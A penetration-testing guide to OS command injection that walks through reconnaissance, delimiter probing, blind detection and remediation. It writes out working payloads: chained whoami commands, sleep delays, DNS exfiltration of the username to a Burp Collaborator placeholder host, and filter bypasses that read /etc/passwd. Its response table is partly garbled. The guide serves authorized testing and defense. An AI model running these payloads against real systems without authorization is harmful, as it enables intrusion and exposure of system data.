```text
┌────────────────────────────────────────────────────────────────────────┐
│                 OS COMMAND INJECTION TESTING FLOW                      │
└────────────────────────────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 1: Entry Point & System Reconnaissance     │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 2: Command Delimiter & Injection Probing   │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 3: Response Analysis & Execution Context   │
          └──────────────────────────────────────────────────┘
                                   │
                                   ▼
          ┌──────────────────────────────────────────────────┐
          │ Phase 4: Safe Impact Verification & Reporting    │
          └──────────────────────────────────────────────────┘

```

---

### Step-by-Step Methodology Flow

#### Phase 1: Entry Point & System Reconnaissance

* **Identify High-Risk Parameters:** Focus on application features that trigger system-level utilities behind the scenes:
* Network/System Utilities (ping, traceroute, DNS lookups).
* File Management & Conversion (PDF generation, image resizing via ImageMagick, zip/unzip actions).
* System Reports & Stock/Inventory Queries (calling shell scripts or local CLI tools).


* **Identify Target Operating System:** Determine backend OS via HTTP response headers (`Server: Apache/2.4 (Ubuntu)` vs `Server: Microsoft-IIS/10.0`) or error message stack traces.
* **Establish Baseline Behavior:** Send standard, expected input (e.g., `storeID=1`) in Burp Repeater and record baseline response length, headers, and execution time.

---

#### Phase 2: Command Delimiter & Injection Probing

* **Conceptual Mechanism:** Command injection occurs when unsanitized user input is passed directly to a system shell execution function (such as `system()`, `exec()`, `Runtime.getRuntime().exec()`, or `child_process.exec()`).
* *Analogy:* Command injection is like placing an order at a drive-thru window and saying, *"I'll take a burger, AND ALSO go open the back door."* If the system processes the second clause as a direct command to the operating system rather than part of the burger order, the security boundary fails.


* **Test Command Chaining Operators:** Inject OS-specific chain operators combined with benign commands:
* **Pipe Operator (`|`):** Sends output of left command to input of right command (`1|whoami`).
* **Sequential Execution (`;&` / `;`):** Executes second command regardless (`1; whoami` on Linux).
* **AND Operator (`&&`):** Executes second command only if first succeeds (`1 && whoami`).
* **OR Operator (`||`):** Executes second command only if first fails (`invalid_id || whoami`).
* **Command Subshell (`$()` / ```):** Evaluates inner command inline (`1$(whoami)` or `1`whoami``).   * **Newline Injection (`\%0a` / `\n`):** Breaks command lines in shell contexts (`1\%0awhoami`).  ---  #### Phase 3: Response Analysis & Execution Context * **In-Band (Direct Output) Analysis:** Check if the output of the injected command is reflected directly inside the HTTP response body (e.g., returning `www-data` or `nt authority\system`). * **Blind Command Injection Probing:** If no direct command output appears in the response body, test for indirect execution:   * **Time Delay Injection:** Force the server to sleep for a specified duration to measure execution latency:     * Linux: `1; sleep 5`     * Windows: `1 & timeout /t 5` or `1 & ping -n 6 127.0.0.1`   * **Out-of-Band (OOB) DNS Exfiltration:** Force the server to issue an external DNS query via Burp Collaborator:     * Linux: `1; nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN`
* Windows: `1 & nslookup %USERNAME%.BURP-COLLABORATOR-SUBDOMAIN`





---

#### Phase 4: Safe Impact Verification & Reporting

* **Verify System Privileges:** Confirm execution context safely using standard identity queries (`whoami`, `id`, `hostname`).
* **Assess Scope & Permissions:** Determine if the web server process runs under low privileges (`www-data`, `nobody`, `LOCAL SERVICE`) or elevated privileges (`root`, `SYSTEM`).
* **Document Proof of Concept (PoC):** Capture HTTP requests and responses demonstrating successful command execution.

---

### Real-World Response Matrix

| Injected Payload | Server Output / Response | System Execution Context | Next Action Step |
| --- | --- | --- | --- |
| `1|whoami` | `200 OK` + `www-data` in body | **In-Band Command Injection Confirmed.** | Document privilege level and submit report. |
| `1; sleep 5` | `200 OK` (Response delayed by 5s) | **Blind Command Injection Confirmed.** | Confirm via OOB DNS lookup or secondary delay tests. |
| `1|whoami` | `500 Internal Server Error` | Input reached shell, but command syntax broke query. | Adjust syntax (try quotes, spaces, or space bypasses like `${IFS}`). |
| `1'|whoami` | `400 Bad Request` / WAF Block | Input blocked by WAF or character sanitization. | Test alternative delimiters (`%0a`, `$()`) or encoding tricks. \vert{}  ---  ### Critical Real-World Factors  * **OS Syntax & Shell Differences:**   * **Linux (Bash/Sh):** Uses `;`, `&&`, `\vert{}\vert{}`, `\vert{}`, `$()`, ```, `${IFS}` for spaces. |
| * **Windows (CMD):** Uses `&`, `&&`, ` |  | `, ` | `. Does not support `;`or`$()`. |
| * **Windows (PowerShell):** Uses `;`, ` | `, `$(...)`. |  |  |

* **Bypassing Space Restrictions:** When web application filters strip or reject spaces in input parameters, use shell-native space replacements:
* Linux: `cat${IFS}/etc/passwd` or `cat</etc/passwd` or `{cat,/etc/passwd}`
* Windows: `cmd.exe/c"type%SystemRoot%\win.ini"`


* **Remediation & Defense Mechanics:**
* **Avoid Shell Execution Functions:** Never pass user input to raw system shell callers (`system()`, `popen()`, `exec()`).
* **Parameterized APIs:** Use language-native process builders that accept arguments as strict array parameters without invoking a shell interpreter:
* *Python:* `subprocess.run(["/usr/bin/stock_check", store_id])` (with `shell=False`).
* *Node.js:* `execFile('/usr/bin/stock_check', [store_id])`.




* **Safe Ethical Hacking PoC Standard:**
* **Never** execute destructive or modifying system commands (`rm -rf`, `del`, `kill`, `reboot`, or modifying file permissions).
* **Never** download external malicious binaries, create reverse shells, or access sensitive user data on production client systems during authorized engagements.
* Non-destructive commands (`whoami`, `id`, `hostname`, or time delays) fully satisfy penetration testing proof-of-concept requirements.



---

### Related Next Steps to Explore

* **Blind OS Command Injection:** Testing out-of-band exfiltration techniques (DNS/HTTP via Burp Collaborator) when application output is completely suppressed.
* **Filter Evasion & Obfuscation:** Bypassing strict character blacklists using environment variables (`$PATH`, `$IFS`), base64 encoding, and string concatenation.
* **Privilege Escalation Post-Exploitation:** Understanding how low-privileged web server execution contexts (`www-data`) are analyzed for local privilege escalation paths.

---> **Key Insight:** OS command injection occurs when an application passes un-sanitized user input directly to a system shell interpreter; replacing raw shell function calls with parameterized execution APIs neutralizes the attack vector completely.
